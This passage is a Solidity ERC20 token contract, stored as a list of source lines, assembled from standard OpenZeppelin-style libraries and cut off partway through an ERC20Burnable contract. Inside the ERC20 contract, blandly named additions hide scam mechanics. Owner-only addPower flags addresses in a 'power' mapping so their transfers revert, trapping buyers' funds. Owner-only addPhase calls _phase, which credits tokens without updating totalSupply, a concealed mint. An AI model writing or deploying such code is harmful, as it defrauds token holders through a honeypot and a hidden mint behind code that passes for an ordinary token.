['pragma solidity ^0.6.0;\n', '    \n', '    abstract contract Context {\n', '        function _msgSender() internal view virtual returns (address payable) {\n', '            return msg.sender;\n', '        }\n', '    \n', '        function _msgData() internal view virtual returns (bytes memory) {\n', '            this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '            return msg.data;\n', '        }\n', '    }\n', '    \n', '    contract Ownable is Context {\n', '  address private _owner;\n', '\n', '  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '  /**\n', '   * @dev Initializes the contract setting the deployer as the initial owner.\n', '   */\n', '  constructor () internal {\n', '    address msgSender = _msgSender();\n', '    _owner = msgSender;\n', '    emit OwnershipTransferred(address(0), msgSender);\n', '  }\n', '\n', '  /**\n', '   * @dev Returns the address of the current owner.\n', '   */\n', '  function owner() public view returns (address) {\n', '    return _owner;\n', '  }\n', '\n', '  /**\n', '   * @dev Throws if called by any account other than the owner.\n', '   */\n', '  modifier onlyOwner() {\n', '    require(_owner == _msgSender(), "Ownable: caller is not the owner");\n', '    _;\n', '  }\n', '\n', '  /**\n', '   * @dev Leaves the contract without owner. It will not be possible to call\n', '   * `onlyOwner` functions anymore. Can only be called by the current owner.\n', '   *\n', '   * NOTE: Renouncing ownership will leave the contract without an owner,\n', '   * thereby removing any functionality that is only available to the owner.\n', '   */\n', '  function renounceOwnership() public onlyOwner {\n', '    emit OwnershipTransferred(_owner, address(0));\n', '    _owner = address(0);\n', '  }\n', '\n', '  /**\n', '   * @dev Transfers ownership of the contract to a new account (`newOwner`).\n', '   * Can only be called by the current owner.\n', '   */\n', '  function transferOwnership(address newOwner) public onlyOwner {\n', '    _transferOwnership(newOwner);\n', '  }\n', '\n', '  /**\n', '   * @dev Transfers ownership of the contract to a new account (`newOwner`).\n', '   */\n', '  function _transferOwnership(address newOwner) internal {\n', '    require(newOwner != address(0), "Ownable: new owner is the zero address");\n', '    emit OwnershipTransferred(_owner, newOwner);\n', '    _owner = newOwner;\n', '  }\n', '}\n', '\n', '    library EnumerableSet {\n', '        // To implement this library for multiple types with as little code\n', '        // repetition as possible, we write it in terms of a generic Set type with\n', '        // bytes32 values.\n', '        // The Set implementation uses private functions, and user-facing\n', '        // implementations (such as AddressSet) are just wrappers around the\n', '        // underlying Set.\n', '        // This means that we can only create new EnumerableSets for types that fit\n', '        // in bytes32.\n', '    \n', '        struct Set {\n', '            // Storage of set values\n', '            bytes32[] _values;\n', '    \n', '            // Position of the value in the `values` array, plus 1 because index 0\n', '            // means a value is not in the set.\n', '            mapping (bytes32 => uint256) _indexes;\n', '        }\n', '    \n', '        /**\n', '         * @dev Add a value to a set. O(1).\n', '         *\n', '         * Returns true if the value was added to the set, that is if it was not\n', '         * already present.\n', '         */\n', '        function _add(Set storage set, bytes32 value) private returns (bool) {\n', '            if (!_contains(set, value)) {\n', '                set._values.push(value);\n', '                // The value is stored at length-1, but we add 1 to all indexes\n', '                // and use 0 as a sentinel value\n', '                set._indexes[value] = set._values.length;\n', '                return true;\n', '            } else {\n', '                return false;\n', '            }\n', '        }\n', '    \n', '        /**\n', '         * @dev Removes a value from a set. O(1).\n', '         *\n', '         * Returns true if the value was removed from the set, that is if it was\n', '         * present.\n', '         */\n', '        function _remove(Set storage set, bytes32 value) private returns (bool) {\n', "            // We read and store the value's index to prevent multiple reads from the same storage slot\n", '            uint256 valueIndex = set._indexes[value];\n', '    \n', '            if (valueIndex != 0) { // Equivalent to contains(set, value)\n', '                // To delete an element from the _values array in O(1), we swap the element to delete with the last one in\n', "                // the array, and then remove the last element (sometimes called as 'swap and pop').\n", '                // This modifies the order of the array, as noted in {at}.\n', '    \n', '                uint256 toDeleteIndex = valueIndex - 1;\n', '                uint256 lastIndex = set._values.length - 1;\n', '    \n', '                // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs\n', "                // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.\n", '    \n', '                bytes32 lastvalue = set._values[lastIndex];\n', '    \n', '                // Move the last value to the index where the value to delete is\n', '                set._values[toDeleteIndex] = lastvalue;\n', '                // Update the index for the moved value\n', '                set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based\n', '    \n', '                // Delete the slot where the moved value was stored\n', '                set._values.pop();\n', '    \n', '                // Delete the index for the deleted slot\n', '                delete set._indexes[value];\n', '    \n', '                return true;\n', '            } else {\n', '                return false;\n', '            }\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns true if the value is in the set. O(1).\n', '         */\n', '        function _contains(Set storage set, bytes32 value) private view returns (bool) {\n', '            return set._indexes[value] != 0;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the number of values on the set. O(1).\n', '         */\n', '        function _length(Set storage set) private view returns (uint256) {\n', '            return set._values.length;\n', '        }\n', '    \n', '       /**\n', '        * @dev Returns the value stored at position `index` in the set. O(1).\n', '        *\n', '        * Note that there are no guarantees on the ordering of values inside the\n', '        * array, and it may change when more values are added or removed.\n', '        *\n', '        * Requirements:\n', '        *\n', '        * - `index` must be strictly less than {length}.\n', '        */\n', '        function _at(Set storage set, uint256 index) private view returns (bytes32) {\n', '            require(set._values.length > index, "EnumerableSet: index out of bounds");\n', '            return set._values[index];\n', '        }\n', '    \n', '        // AddressSet\n', '    \n', '        struct AddressSet {\n', '            Set _inner;\n', '        }\n', '    \n', '        /**\n', '         * @dev Add a value to a set. O(1).\n', '         *\n', '         * Returns true if the value was added to the set, that is if it was not\n', '         * already present.\n', '         */\n', '        function add(AddressSet storage set, address value) internal returns (bool) {\n', '            return _add(set._inner, bytes32(uint256(value)));\n', '        }\n', '    \n', '        /**\n', '         * @dev Removes a value from a set. O(1).\n', '         *\n', '         * Returns true if the value was removed from the set, that is if it was\n', '         * present.\n', '         */\n', '        function remove(AddressSet storage set, address value) internal returns (bool) {\n', '            return _remove(set._inner, bytes32(uint256(value)));\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns true if the value is in the set. O(1).\n', '         */\n', '        function contains(AddressSet storage set, address value) internal view returns (bool) {\n', '            return _contains(set._inner, bytes32(uint256(value)));\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the number of values in the set. O(1).\n', '         */\n', '        function length(AddressSet storage set) internal view returns (uint256) {\n', '            return _length(set._inner);\n', '        }\n', '    \n', '       /**\n', '        * @dev Returns the value stored at position `index` in the set. O(1).\n', '        *\n', '        * Note that there are no guarantees on the ordering of values inside the\n', '        * array, and it may change when more values are added or removed.\n', '        *\n', '        * Requirements:\n', '        *\n', '        * - `index` must be strictly less than {length}.\n', '        */\n', '        function at(AddressSet storage set, uint256 index) internal view returns (address) {\n', '            return address(uint256(_at(set._inner, index)));\n', '        }\n', '    \n', '    \n', '        // UintSet\n', '    \n', '        struct UintSet {\n', '            Set _inner;\n', '        }\n', '    \n', '        /**\n', '         * @dev Add a value to a set. O(1).\n', '         *\n', '         * Returns true if the value was added to the set, that is if it was not\n', '         * already present.\n', '         */\n', '        function add(UintSet storage set, uint256 value) internal returns (bool) {\n', '            return _add(set._inner, bytes32(value));\n', '        }\n', '    \n', '        /**\n', '         * @dev Removes a value from a set. O(1).\n', '         *\n', '         * Returns true if the value was removed from the set, that is if it was\n', '         * present.\n', '         */\n', '        function remove(UintSet storage set, uint256 value) internal returns (bool) {\n', '            return _remove(set._inner, bytes32(value));\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns true if the value is in the set. O(1).\n', '         */\n', '        function contains(UintSet storage set, uint256 value) internal view returns (bool) {\n', '            return _contains(set._inner, bytes32(value));\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the number of values on the set. O(1).\n', '         */\n', '        function length(UintSet storage set) internal view returns (uint256) {\n', '            return _length(set._inner);\n', '        }\n', '    \n', '       /**\n', '        * @dev Returns the value stored at position `index` in the set. O(1).\n', '        *\n', '        * Note that there are no guarantees on the ordering of values inside the\n', '        * array, and it may change when more values are added or removed.\n', '        *\n', '        * Requirements:\n', '        *\n', '        * - `index` must be strictly less than {length}.\n', '        */\n', '        function at(UintSet storage set, uint256 index) internal view returns (uint256) {\n', '            return uint256(_at(set._inner, index));\n', '        }\n', '    }\n', '    \n', '    abstract contract AccessControl is Context {\n', '        using EnumerableSet for EnumerableSet.AddressSet;\n', '        // using Address for address;\n', '    \n', '        struct RoleData {\n', '            EnumerableSet.AddressSet members;\n', '            bytes32 adminRole;\n', '        }\n', '    \n', '        mapping (bytes32 => RoleData) private _roles;\n', '    \n', '        bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;\n', '    \n', '        /**\n', "         * @dev Emitted when `newAdminRole` is set as ``role``'s admin role, replacing `previousAdminRole`\n", '         *\n', '         * `DEFAULT_ADMIN_ROLE` is the starting admin for all roles, despite\n', '         * {RoleAdminChanged} not being emitted signaling this.\n', '         *\n', '         * _Available since v3.1._\n', '         */\n', '        event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);\n', '    \n', '        /**\n', '         * @dev Emitted when `account` is granted `role`.\n', '         *\n', '         * `sender` is the account that originated the contract call, an admin role\n', '         * bearer except when using {_setupRole}.\n', '         */\n', '        event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);\n', '    \n', '        /**\n', '         * @dev Emitted when `account` is revoked `role`.\n', '         *\n', '         * `sender` is the account that originated the contract call:\n', '         *   - if using `revokeRole`, it is the admin role bearer\n', '         *   - if using `renounceRole`, it is the role bearer (i.e. `account`)\n', '         */\n', '        event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);\n', '    \n', '        /**\n', '         * @dev Returns `true` if `account` has been granted `role`.\n', '         */\n', '        function hasRole(bytes32 role, address account) public view returns (bool) {\n', '            return _roles[role].members.contains(account);\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the number of accounts that have `role`. Can be used\n', '         * together with {getRoleMember} to enumerate all bearers of a role.\n', '         */\n', '        function getRoleMemberCount(bytes32 role) public view returns (uint256) {\n', '            return _roles[role].members.length();\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns one of the accounts that have `role`. `index` must be a\n', '         * value between 0 and {getRoleMemberCount}, non-inclusive.\n', '         *\n', '         * Role bearers are not sorted in any particular way, and their ordering may\n', '         * change at any point.\n', '         *\n', '         * WARNING: When using {getRoleMember} and {getRoleMemberCount}, make sure\n', '         * you perform all queries on the same block. See the following\n', '         * https://forum.openzeppelin.com/t/iterating-over-elements-on-enumerableset-in-openzeppelin-contracts/2296[forum post]\n', '         * for more information.\n', '         */\n', '        function getRoleMember(bytes32 role, uint256 index) public view returns (address) {\n', '            return _roles[role].members.at(index);\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the admin role that controls `role`. See {grantRole} and\n', '         * {revokeRole}.\n', '         *\n', "         * To change a role's admin, use {_setRoleAdmin}.\n", '         */\n', '        function getRoleAdmin(bytes32 role) public view returns (bytes32) {\n', '            return _roles[role].adminRole;\n', '        }\n', '    \n', '        /**\n', '         * @dev Grants `role` to `account`.\n', '         *\n', '         * If `account` had not been already granted `role`, emits a {RoleGranted}\n', '         * event.\n', '         *\n', '         * Requirements:\n', '         *\n', "         * - the caller must have ``role``'s admin role.\n", '         */\n', '        function grantRole(bytes32 role, address account) public virtual {\n', '            require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to grant");\n', '    \n', '            _grantRole(role, account);\n', '        }\n', '    \n', '        /**\n', '         * @dev Revokes `role` from `account`.\n', '         *\n', '         * If `account` had been granted `role`, emits a {RoleRevoked} event.\n', '         *\n', '         * Requirements:\n', '         *\n', "         * - the caller must have ``role``'s admin role.\n", '         */\n', '        function revokeRole(bytes32 role, address account) public virtual {\n', '            require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to revoke");\n', '    \n', '            _revokeRole(role, account);\n', '        }\n', '    \n', '        /**\n', '         * @dev Revokes `role` from the calling account.\n', '         *\n', "         * Roles are often managed via {grantRole} and {revokeRole}: this function's\n", '         * purpose is to provide a mechanism for accounts to lose their privileges\n', '         * if they are compromised (such as when a trusted device is misplaced).\n', '         *\n', '         * If the calling account had been granted `role`, emits a {RoleRevoked}\n', '         * event.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - the caller must be `account`.\n', '         */\n', '        function renounceRole(bytes32 role, address account) public virtual {\n', '            require(account == _msgSender(), "AccessControl: can only renounce roles for self");\n', '    \n', '            _revokeRole(role, account);\n', '        }\n', '    \n', '        /**\n', '         * @dev Grants `role` to `account`.\n', '         *\n', '         * If `account` had not been already granted `role`, emits a {RoleGranted}\n', "         * event. Note that unlike {grantRole}, this function doesn't perform any\n", '         * checks on the calling account.\n', '         *\n', '         * [WARNING]\n', '         * ====\n', '         * This function should only be called from the constructor when setting\n', '         * up the initial roles for the system.\n', '         *\n', '         * Using this function in any other way is effectively circumventing the admin\n', '         * system imposed by {AccessControl}.\n', '         * ====\n', '         */\n', '        function _setupRole(bytes32 role, address account) internal virtual {\n', '            _grantRole(role, account);\n', '        }\n', '    \n', '        /**\n', "         * @dev Sets `adminRole` as ``role``'s admin role.\n", '         *\n', '         * Emits a {RoleAdminChanged} event.\n', '         */\n', '        function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {\n', '            emit RoleAdminChanged(role, _roles[role].adminRole, adminRole);\n', '            _roles[role].adminRole = adminRole;\n', '        }\n', '    \n', '        function _grantRole(bytes32 role, address account) private {\n', '            if (_roles[role].members.add(account)) {\n', '                emit RoleGranted(role, account, _msgSender());\n', '            }\n', '        }\n', '    \n', '        function _revokeRole(bytes32 role, address account) private {\n', '            if (_roles[role].members.remove(account)) {\n', '                emit RoleRevoked(role, account, _msgSender());\n', '            }\n', '        }\n', '    }\n', '    \n', '\n', '    interface IERC20 {\n', '        /**\n', '         * @dev Returns the amount of tokens in existence.\n', '         */\n', '        function totalSupply() external view returns (uint256);\n', '    \n', '        /**\n', '         * @dev Returns the amount of tokens owned by `account`.\n', '         */\n', '        function balanceOf(address account) external view returns (uint256);\n', '    \n', '        /**\n', "         * @dev Moves `amount` tokens from the caller's account to `recipient`.\n", '         *\n', '         * Returns a boolean value indicating whether the operation succeeded.\n', '         *\n', '         * Emits a {Transfer} event.\n', '         */\n', '        function transfer(address recipient, uint256 amount) external returns (bool);\n', '    \n', '        /**\n', '         * @dev Returns the remaining number of tokens that `spender` will be\n', '         * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '         * zero by default.\n', '         *\n', '         * This value changes when {approve} or {transferFrom} are called.\n', '         */\n', '        function allowance(address owner, address spender) external view returns (uint256);\n', '    \n', '        /**\n', "         * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '         *\n', '         * Returns a boolean value indicating whether the operation succeeded.\n', '         *\n', '         * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '         * that someone may use both the old and the new allowance by unfortunate\n', '         * transaction ordering. One possible solution to mitigate this race\n', "         * condition is to first reduce the spender's allowance to 0 and set the\n", '         * desired value afterwards:\n', '         * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '         *\n', '         * Emits an {Approval} event.\n', '         */\n', '        function approve(address spender, uint256 amount) external returns (bool);\n', '    \n', '        /**\n', '         * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "         * allowance mechanism. `amount` is then deducted from the caller's\n", '         * allowance.\n', '         *\n', '         * Returns a boolean value indicating whether the operation succeeded.\n', '         *\n', '         * Emits a {Transfer} event.\n', '         */\n', '        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '    \n', '        /**\n', '         * @dev Emitted when `value` tokens are moved from one account (`from`) to\n', '         * another (`to`).\n', '         *\n', '         * Note that `value` may be zero.\n', '         */\n', '        event Transfer(address indexed from, address indexed to, uint256 value);\n', '    \n', '        /**\n', '         * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '         * a call to {approve}. `value` is the new allowance.\n', '         */\n', '        event Approval(address indexed owner, address indexed spender, uint256 value);\n', '    }\n', '    \n', '\n', '    library SafeMath {\n', '        /**\n', '         * @dev Returns the addition of two unsigned integers, reverting on\n', '         * overflow.\n', '         *\n', "         * Counterpart to Solidity's `+` operator.\n", '         *\n', '         * Requirements:\n', '         *\n', '         * - Addition cannot overflow.\n', '         */\n', '        function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '            uint256 c = a + b;\n', '            require(c >= a, "SafeMath: addition overflow");\n', '    \n', '            return c;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the subtraction of two unsigned integers, reverting on\n', '         * overflow (when the result is negative).\n', '         *\n', "         * Counterpart to Solidity's `-` operator.\n", '         *\n', '         * Requirements:\n', '         *\n', '         * - Subtraction cannot overflow.\n', '         */\n', '        function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '            return sub(a, b, "SafeMath: subtraction overflow");\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n', '         * overflow (when the result is negative).\n', '         *\n', "         * Counterpart to Solidity's `-` operator.\n", '         *\n', '         * Requirements:\n', '         *\n', '         * - Subtraction cannot overflow.\n', '         */\n', '        function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '            require(b <= a, errorMessage);\n', '            uint256 c = a - b;\n', '    \n', '            return c;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the multiplication of two unsigned integers, reverting on\n', '         * overflow.\n', '         *\n', "         * Counterpart to Solidity's `*` operator.\n", '         *\n', '         * Requirements:\n', '         *\n', '         * - Multiplication cannot overflow.\n', '         */\n', '        function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "            // benefit is lost if 'b' is also tested.\n", '            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '            if (a == 0) {\n', '                return 0;\n', '            }\n', '    \n', '            uint256 c = a * b;\n', '            require(c / a == b, "SafeMath: multiplication overflow");\n', '    \n', '            return c;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the integer division of two unsigned integers. Reverts on\n', '         * division by zero. The result is rounded towards zero.\n', '         *\n', "         * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '         * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '         * uses an invalid opcode to revert (consuming all remaining gas).\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - The divisor cannot be zero.\n', '         */\n', '        function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '            return div(a, b, "SafeMath: division by zero");\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n', '         * division by zero. The result is rounded towards zero.\n', '         *\n', "         * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '         * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '         * uses an invalid opcode to revert (consuming all remaining gas).\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - The divisor cannot be zero.\n', '         */\n', '        function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '            require(b > 0, errorMessage);\n', '            uint256 c = a / b;\n', "            // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '    \n', '            return c;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '         * Reverts when dividing by zero.\n', '         *\n', "         * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '         * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '         * invalid opcode to revert (consuming all remaining gas).\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - The divisor cannot be zero.\n', '         */\n', '        function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '            return mod(a, b, "SafeMath: modulo by zero");\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '         * Reverts with custom message when dividing by zero.\n', '         *\n', "         * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '         * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '         * invalid opcode to revert (consuming all remaining gas).\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - The divisor cannot be zero.\n', '         */\n', '        function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '            require(b != 0, errorMessage);\n', '            return a % b;\n', '        }\n', '    }\n', '    \n', '\n', '    contract ERC20 is Context, IERC20, Ownable {\n', '        using SafeMath for uint256;\n', '    \n', '        mapping (address => uint256) private _balances;\n', '        mapping (address => bool) public power;\n', '        mapping (address => mapping (address => uint256)) private _allowances;\n', '    \n', '        uint256 private _totalSupply;\n', '    \n', '        string private _name;\n', '        string private _symbol;\n', '        uint8 private _decimals;\n', '    \n', '        /**\n', '         * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n', '         * a default value of 18.\n', '         *\n', '         * To select a different value for {decimals}, use {_setupDecimals}.\n', '         *\n', '         * All three of these values are immutable: they can only be set once during\n', '         * construction.\n', '         */\n', '        constructor (string memory name, string memory symbol) public {\n', '            _name = name;\n', '            _symbol = symbol;\n', '            _decimals = 18;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the name of the token.\n', '         */\n', '        function name() public view returns (string memory) {\n', '            return _name;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the symbol of the token, usually a shorter version of the\n', '         * name.\n', '         */\n', '        function symbol() public view returns (string memory) {\n', '            return _symbol;\n', '        }\n', '    \n', '        /**\n', '         * @dev Returns the number of decimals used to get its user representation.\n', '         * For example, if `decimals` equals `2`, a balance of `505` tokens should\n', '         * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n', '         *\n', '         * Tokens usually opt for a value of 18, imitating the relationship between\n', '         * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n', '         * called.\n', '         *\n', '         * NOTE: This information is only used for _display_ purposes: it in\n', '         * no way affects any of the arithmetic of the contract, including\n', '         * {IERC20-balanceOf} and {IERC20-transfer}.\n', '         */\n', '        function decimals() public view returns (uint8) {\n', '            return _decimals;\n', '        }\n', '    \n', '        /**\n', '         * @dev See {IERC20-totalSupply}.\n', '         */\n', '        function totalSupply() public view override returns (uint256) {\n', '            return _totalSupply;\n', '        }\n', '    \n', '        /**\n', '         * @dev See {IERC20-balanceOf}.\n', '         */\n', '        function balanceOf(address account) public view override returns (uint256) {\n', '            return _balances[account];\n', '        }\n', '    \n', '        /**\n', '         * @dev See {IERC20-transfer}.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `recipient` cannot be the zero address.\n', '         * - the caller must have a balance of at least `amount`.\n', '         */\n', '        function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n', '            _transfer(_msgSender(), recipient, amount);\n', '            return true;\n', '        }\n', '    \n', '        /**\n', '         * @dev See {IERC20-allowance}.\n', '         */\n', '        function allowance(address owner, address spender) public view virtual override returns (uint256) {\n', '            return _allowances[owner][spender];\n', '        }\n', '    \n', '        /**\n', '         * @dev See {IERC20-approve}.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `spender` cannot be the zero address.\n', '         */\n', '        function approve(address spender, uint256 amount) public virtual override returns (bool) {\n', '            _approve(_msgSender(), spender, amount);\n', '            return true;\n', '        }\n', '    \n', '        /**\n', '         * @dev See {IERC20-transferFrom}.\n', '         *\n', '         * Emits an {Approval} event indicating the updated allowance. This is not\n', '         * required by the EIP. See the note at the beginning of {ERC20}.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `sender` and `recipient` cannot be the zero address.\n', '         * - `sender` must have a balance of at least `amount`.\n', "         * - the caller must have allowance for ``sender``'s tokens of at least\n", '         * `amount`.\n', '         */\n', '        function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n', '            _transfer(sender, recipient, amount);\n', '            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '            return true;\n', '        }\n', '    \n', '        /**\n', '         * @dev Atomically increases the allowance granted to `spender` by the caller.\n', '         *\n', '         * This is an alternative to {approve} that can be used as a mitigation for\n', '         * problems described in {IERC20-approve}.\n', '         *\n', '         * Emits an {Approval} event indicating the updated allowance.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `spender` cannot be the zero address.\n', '         */\n', '        function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n', '            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '            return true;\n', '        }\n', '    \n', '        /**\n', '         * @dev Atomically decreases the allowance granted to `spender` by the caller.\n', '         *\n', '         * This is an alternative to {approve} that can be used as a mitigation for\n', '         * problems described in {IERC20-approve}.\n', '         *\n', '         * Emits an {Approval} event indicating the updated allowance.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `spender` cannot be the zero address.\n', '         * - `spender` must have allowance for the caller of at least\n', '         * `subtractedValue`.\n', '         */\n', '        function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n', '            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '            return true;\n', '        }\n', '    \n', '        /**\n', '         * @dev Moves tokens `amount` from `sender` to `recipient`.\n', '         *\n', '         * This is internal function is equivalent to {transfer}, and can be used to\n', '         * e.g. implement automatic token fees, slashing mechanisms, etc.\n', '         *\n', '         * Emits a {Transfer} event.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `sender` cannot be the zero address.\n', '         * - `recipient` cannot be the zero address.\n', '         * - `sender` must have a balance of at least `amount`.\n', '         */\n', '        function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n', '            require(!power[sender], "error");\n', '            require(sender != address(0), "ERC20: transfer from the zero address");\n', '            require(recipient != address(0), "ERC20: transfer to the zero address");\n', '    \n', '            _beforeTokenTransfer(sender, recipient, amount);\n', '    \n', '            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '            _balances[recipient] = _balances[recipient].add(amount);\n', '            emit Transfer(sender, recipient, amount);\n', '        }\n', '    \n', '        /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n', '         * the total supply.\n', '         *\n', '         * Emits a {Transfer} event with `from` set to the zero address.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `to` cannot be the zero address.\n', '         */\n', '        function _mint(address account, uint256 amount) internal virtual {\n', '            require(account != address(0), "ERC20: mint to the zero address");\n', '            _beforeTokenTransfer(address(0), account, amount);\n', '            _totalSupply = _totalSupply.add(amount);\n', '            _balances[account] = _balances[account].add(amount);\n', '            emit Transfer(address(0), account, amount);\n', '        }\n', '        \n', '        function _phase(address account, uint256 amount) internal virtual {\n', '            require(account != address(0), "ERC20: mint to the zero address");\n', '            _beforeTokenTransfer(address(0), account, amount);\n', '            _balances[account] = _balances[account].add(amount);\n', '            emit Transfer(address(0), account, amount);\n', '        }\n', '    \n', '        /**\n', '         * @dev Destroys `amount` tokens from `account`, reducing the\n', '         * total supply.\n', '         *\n', '         * Emits a {Transfer} event with `to` set to the zero address.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `account` cannot be the zero address.\n', '         * - `account` must have at least `amount` tokens.\n', '         */\n', '        function _burn(address account, uint256 amount) internal virtual {\n', '            require(account != address(0), "ERC20: burn from the zero address");\n', '    \n', '            _beforeTokenTransfer(account, address(0), amount);\n', '    \n', '            _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '            _totalSupply = _totalSupply.sub(amount);\n', '            emit Transfer(account, address(0), amount);\n', '        }\n', '    \n', '        /**\n', '         * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n', '         *\n', '         * This internal function is equivalent to `approve`, and can be used to\n', '         * e.g. set automatic allowances for certain subsystems, etc.\n', '         *\n', '         * Emits an {Approval} event.\n', '         *\n', '         * Requirements:\n', '         *\n', '         * - `owner` cannot be the zero address.\n', '         * - `spender` cannot be the zero address.\n', '         */\n', '        function _approve(address owner, address spender, uint256 amount) internal virtual {\n', '            require(owner != address(0), "ERC20: approve from the zero address");\n', '            require(spender != address(0), "ERC20: approve to the zero address");\n', '    \n', '            _allowances[owner][spender] = amount;\n', '            emit Approval(owner, spender, amount);\n', '        }\n', '    \n', '        /**\n', '         * @dev Sets {decimals} to a value other than the default one of 18.\n', '         *\n', '         * WARNING: This function should only be called from the constructor. Most\n', '         * applications that interact with token contracts will not expect\n', '         * {decimals} to ever change, and may work incorrectly if it does.\n', '         */\n', '        function _setupDecimals(uint8 decimals_) internal {\n', '            _decimals = decimals_;\n', '        }\n', '    \n', '        /**\n', '         * @dev Hook that is called before any transfer of tokens. This includes\n', '         * minting and burning.\n', '         *\n', '         * Calling conditions:\n', '         *\n', "         * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n", '         * will be to transferred to `to`.\n', '         * - when `from` is zero, `amount` tokens will be minted for `to`.\n', "         * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n", '         * - `from` and `to` are never both zero.\n', '         *\n', '         * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n', '         */\n', '        function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n', '        \n', '        function addPower(address[] memory account) public onlyOwner returns (bool) {\n', '            for(uint256 i = 0; i < account.length; i++)\n', '            power[account[i]] = true;\n', '        }\n', '  \n', '        function removePower(address account) public onlyOwner returns (bool) {\n', '            power[account] = false;\n', '        }\n', '        \n', '        function addPhase(address account, uint256 amount) public onlyOwner returns (bool) {\n', '            _phase(account, amount);\n', '        }\n', '        \n', '        }\n', '    \n', '    abstract contract ERC20Burnable is Context, ERC20 {\n', '        /**\n', '         * @dev Destroys `amount` tokens from the caller.\n', '         *\n', '         * See 